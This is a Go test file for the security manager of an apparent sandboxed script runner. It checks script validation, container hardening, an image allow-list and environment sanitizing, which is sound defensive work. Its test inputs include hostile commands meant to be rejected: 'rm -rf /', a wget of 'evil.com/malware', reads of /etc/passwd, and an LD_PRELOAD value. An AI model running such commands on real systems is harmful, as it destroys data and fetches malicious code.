package executor

import (
	"context"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/voidrunnerhq/voidrunner/internal/models"
)

func TestNewSecurityManager(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	assert.NotNil(t, sm)
	assert.Equal(t, config, sm.config)
}

func TestSecurityManager_ValidateScriptContent(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	tests := []struct {
		name       string
		content    string
		scriptType models.ScriptType
		expectErr  bool
		errPattern string
	}{
		{
			name:       "Safe Python script",
			content:    "print('Hello, World!')",
			scriptType: models.ScriptTypePython,
			expectErr:  false,
		},
		{
			name:       "Safe Python with math import",
			content:    "import math\nprint(math.sqrt(16))",
			scriptType: models.ScriptTypePython,
			expectErr:  false,
		},
		{
			name:       "Safe Python with json import",
			content:    "import json\ndata = {'key': 'value'}\nprint(json.dumps(data))",
			scriptType: models.ScriptTypePython,
			expectErr:  false,
		},
		{
			name:       "Safe Python with datetime import",
			content:    "from datetime import datetime\nprint(datetime.now())",
			scriptType: models.ScriptTypePython,
			expectErr:  false,
		},
		{
			name:       "Safe Bash script",
			content:    "# Simple comment",
			scriptType: models.ScriptTypeBash,
			expectErr:  false,
		},
		{
			name:       "Safe Bash with pipe",
			content:    "echo 'hello' | grep 'hello'",
			scriptType: models.ScriptTypeBash,
			expectErr:  false,
		},
		{
			name:       "Safe Bash with redirection",
			content:    "echo 'test' > output.txt",
			scriptType: models.ScriptTypeBash,
			expectErr:  false,
		},
		{
			name:       "Safe Bash with logical operators",
			content:    "test -f file.txt && echo 'file exists' || echo 'file not found'",
			scriptType: models.ScriptTypeBash,
			expectErr:  false,
		},
		{
			name:       "Safe JavaScript with console.log",
			content:    "console.log('Hello, World!');",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  false,
		},
		{
			name:       "Safe JavaScript with math operations",
			content:    "const result = Math.sqrt(16);\nconsole.log(result);",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  false,
		},
		{
			name:       "Safe JavaScript with safe require",
			content:    "const crypto = require('crypto');\nconsole.log(crypto.randomBytes(16).toString('hex'));",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  false,
		},
		{
			name:       "Empty script",
			content:    "",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "script content is empty",
		},
		{
			name:       "Dangerous rm command",
			content:    "rm -rf /",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "rm -rf",
		},
		{
			name:       "Network access attempt",
			content:    "wget http://evil.com/malware",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "wget",
		},
		{
			name:       "Docker escape attempt",
			content:    "docker run -it ubuntu /bin/bash",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "docker",
		},
		{
			name:       "Python dangerous import os",
			content:    "import os\nos.system('rm -rf /')",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "dangerous Python import detected: import os",
		},
		{
			name:       "Python subprocess import",
			content:    "import subprocess\nsubprocess.run(['ls'])",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "dangerous Python import detected: import subprocess",
		},
		{
			name:       "Python sys import",
			content:    "import sys\nprint(sys.version)",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "dangerous Python import detected: import sys",
		},
		{
			name:       "Python eval function",
			content:    "eval('print(\"hello\")')",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "dangerous Python pattern detected: eval(",
		},
		{
			name:       "Python exec function",
			content:    "exec('print(\"hello\")')",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "dangerous Python pattern detected: exec(",
		},
		{
			name:       "Python globals function",
			content:    "print(globals())",
			scriptType: models.ScriptTypePython,
			expectErr:  true,
			errPattern: "dangerous Python pattern detected: globals()",
		},
		{
			name:       "Bash dangerous file access",
			content:    "cat /etc/passwd | grep root",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "dangerous Bash pattern detected: passwd",
		},
		{
			name:       "Bash dangerous redirection",
			content:    "echo 'test' > /etc/hosts",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "dangerous Bash pattern detected: > /",
		},
		{
			name:       "Bash sudo attempt",
			content:    "sudo rm -rf /",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "dangerous Bash pattern detected: sudo ",
		},
		{
			name:       "Bash network command",
			content:    "ping google.com",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "dangerous Bash pattern detected: ping ",
		},
		{
			name:       "Bash backtick command substitution",
			content:    "echo `whoami`",
			scriptType: models.ScriptTypeBash,
			expectErr:  true,
			errPattern: "backtick command substitution detected",
		},
		{
			name:       "JavaScript dangerous require fs",
			content:    "const fs = require('fs');",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  true,
			errPattern: "dangerous JavaScript pattern detected: require('fs')",
		},
		{
			name:       "JavaScript dangerous require child_process",
			content:    "const cp = require('child_process');",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  true,
			errPattern: "dangerous JavaScript pattern detected: require('child_process')",
		},
		{
			name:       "JavaScript eval function",
			content:    "eval('console.log(\"hello\")')",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  true,
			errPattern: "dangerous JavaScript pattern detected: eval(",
		},
		{
			name:       "JavaScript process access",
			content:    "console.log(process.env.HOME)",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  true,
			errPattern: "dangerous JavaScript pattern detected: process.env",
		},
		{
			name:       "JavaScript global object access",
			content:    "console.log(global.process)",
			scriptType: models.ScriptTypeJavaScript,
			expectErr:  true,
			errPattern: "dangerous JavaScript pattern detected: global.",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sm.ValidateScriptContent(tt.content, tt.scriptType)
			if tt.expectErr {
				require.Error(t, err)
				if tt.errPattern != "" {
					assert.Contains(t, err.Error(), tt.errPattern)
				}
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestSecurityManager_BuildSecurityConfig(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	task := &models.Task{
		ScriptType:    models.ScriptTypePython,
		ScriptContent: "print('Hello, World!')",
	}

	securityConfig, err := sm.BuildSecurityConfig(task)
	require.NoError(t, err)
	require.NotNil(t, securityConfig)

	assert.Equal(t, "1000:1000", securityConfig.User)
	assert.True(t, securityConfig.NoNewPrivileges)
	assert.True(t, securityConfig.ReadOnlyRootfs)
	assert.True(t, securityConfig.NetworkDisabled)
	assert.True(t, securityConfig.DropAllCapabilities)
	assert.Contains(t, securityConfig.SecurityOpts, "no-new-privileges")
	assert.NotEmpty(t, securityConfig.TmpfsMounts)
}

func TestSecurityManager_BuildSecurityConfig_NilTask(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	securityConfig, err := sm.BuildSecurityConfig(nil)
	require.Error(t, err)
	assert.Nil(t, securityConfig)
	assert.Contains(t, err.Error(), "task is nil")
}

func TestSecurityManager_BuildSecurityConfig_InvalidScript(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	task := &models.Task{
		ScriptType:    models.ScriptTypePython,
		ScriptContent: "import os\nos.system('rm -rf /')",
	}

	securityConfig, err := sm.BuildSecurityConfig(task)
	require.Error(t, err)
	assert.Nil(t, securityConfig)
	assert.Contains(t, err.Error(), "script security validation failed")
}

func TestSecurityManager_CheckImageSecurity(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	tests := []struct {
		name      string
		image     string
		expectErr bool
	}{
		{
			name:      "Allowed Python image",
			image:     "python:3.11-alpine",
			expectErr: false,
		},
		{
			name:      "Allowed Alpine image",
			image:     "alpine:latest",
			expectErr: false,
		},
		{
			name:      "Allowed Node image",
			image:     "node:18-alpine",
			expectErr: false,
		},
		{
			name:      "Disallowed Ubuntu image",
			image:     "ubuntu:latest",
			expectErr: true,
		},
		{
			name:      "Disallowed custom image",
			image:     "malicious/image:latest",
			expectErr: true,
		},
		{
			name:      "Empty image name",
			image:     "",
			expectErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sm.CheckImageSecurity(tt.image)
			if tt.expectErr {
				require.Error(t, err)
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestSecurityManager_SanitizeEnvironment(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	input := []string{
		"PATH=/usr/bin:/bin",
		"HOME=/home/user",
		"SECRET_KEY=mysecret",
		"AWS_ACCESS_KEY=key",
		"DOCKER_HOST=unix:///var/run/docker.sock",
		"PYTHONPATH=/usr/lib/python",
		"LD_PRELOAD=/malicious.so",
		"USER=testuser",
		"LANG=en_US.UTF-8",
	}

	sanitized := sm.SanitizeEnvironment(input)

	// Check that safe variables are included
	assert.Contains(t, sanitized, "PATH=/usr/bin:/bin")
	assert.Contains(t, sanitized, "HOME=/home/user")
	assert.Contains(t, sanitized, "PYTHONPATH=/usr/lib/python")
	assert.Contains(t, sanitized, "USER=testuser")
	assert.Contains(t, sanitized, "LANG=en_US.UTF-8")

	// Check that dangerous variables are excluded
	for _, env := range sanitized {
		assert.NotContains(t, env, "SECRET_KEY")
		assert.NotContains(t, env, "AWS_ACCESS_KEY")
		assert.NotContains(t, env, "DOCKER_HOST")
		assert.NotContains(t, env, "LD_PRELOAD")
	}

	// Check that default safe variables are added
	foundDefaults := 0
	for _, env := range sanitized {
		if env == "PATH=/usr/local/bin:/usr/bin:/bin" ||
			env == "HOME=/tmp" ||
			env == "USER=executor" ||
			env == "PYTHONIOENCODING=utf-8" {
			foundDefaults++
		}
	}
	assert.Greater(t, foundDefaults, 0, "Should include default safe environment variables")
}

// createValidContainerConfig creates a valid container configuration for testing
func createValidContainerConfig() *ContainerConfig {
	return &ContainerConfig{
		Image:       "python:3.11-alpine",
		WorkingDir:  "/tmp/workspace",
		Environment: []string{"PATH=/usr/local/bin:/usr/bin:/bin"},
		SecurityConfig: SecurityConfig{
			User:                "1000:1000",
			ReadOnlyRootfs:      true,
			NetworkDisabled:     true,
			NoNewPrivileges:     true,
			DropAllCapabilities: true,
			SecurityOpts:        []string{"no-new-privileges"},
			TmpfsMounts: map[string]string{
				"/tmp": "rw,noexec,nosuid,size=100m",
			},
		},
		ResourceLimits: ResourceLimits{
			MemoryLimitBytes: 128 * 1024 * 1024,
			CPUQuota:         50000,
			PidsLimit:        128,
			TimeoutSeconds:   300,
		},
		Timeout: 300 * time.Second,
	}
}

func TestSecurityManager_ValidateContainerConfig(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	tests := []struct {
		name      string
		config    *ContainerConfig
		expectErr bool
		errMsg    string
	}{
		{
			name:      "Valid container config",
			config:    createValidContainerConfig(),
			expectErr: false,
		},
		{
			name:      "Nil container config",
			config:    nil,
			expectErr: true,
			errMsg:    "container config is nil",
		},
		{
			name: "Root user not allowed",
			config: func() *ContainerConfig {
				cfg := createValidContainerConfig()
				cfg.SecurityConfig.User = "root"
				return cfg
			}(),
			expectErr: true,
			errMsg:    "root user execution is not allowed",
		},
		{
			name: "Read-only filesystem required",
			config: func() *ContainerConfig {
				cfg := createValidContainerConfig()
				cfg.SecurityConfig.ReadOnlyRootfs = false
				return cfg
			}(),
			expectErr: true,
			errMsg:    "read-only root filesystem must be enabled",
		},
		{
			name: "Network must be disabled",
			config: func() *ContainerConfig {
				cfg := createValidContainerConfig()
				cfg.SecurityConfig.NetworkDisabled = false
				return cfg
			}(),
			expectErr: true,
			errMsg:    "network must be disabled for security",
		},
		{
			name: "Memory limit too high",
			config: func() *ContainerConfig {
				cfg := createValidContainerConfig()
				cfg.ResourceLimits.MemoryLimitBytes = 2 * 1024 * 1024 * 1024 // 2GB
				return cfg
			}(),
			expectErr: true,
			errMsg:    "memory limit (2147483648 bytes) exceeds maximum allowed (1073741824 bytes)",
		},
		{
			name: "Timeout too long",
			config: func() *ContainerConfig {
				cfg := createValidContainerConfig()
				cfg.Timeout = 3700 * time.Second // More than 1 hour
				return cfg
			}(),
			expectErr: true,
			errMsg:    "timeout exceeds maximum allowed (3600 seconds)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := sm.ValidateContainerConfig(tt.config)
			if tt.expectErr {
				require.Error(t, err)
				if tt.errMsg != "" {
					assert.Contains(t, err.Error(), tt.errMsg)
				}
			} else {
				require.NoError(t, err)
			}
		})
	}
}

func TestSecurityManager_GenerateContainerName(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	taskID := "123e4567-e89b-12d3-a456-426614174000"
	name := sm.GenerateContainerName(taskID)

	expected := "voidrunner-task-123e4567-e89b-12d3-a456-426614174000"
	assert.Equal(t, expected, name)
}

func TestSecurityManager_CreateSeccompProfile(t *testing.T) {
	config := NewDefaultConfig()
	sm := NewSecurityManager(config)

	ctx := context.Background()
	profilePath, err := sm.CreateSeccompProfile(ctx)

	require.NoError(t, err)
	assert.NotEmpty(t, profilePath)
	assert.Contains(t, profilePath, "seccomp-profile.json")
}
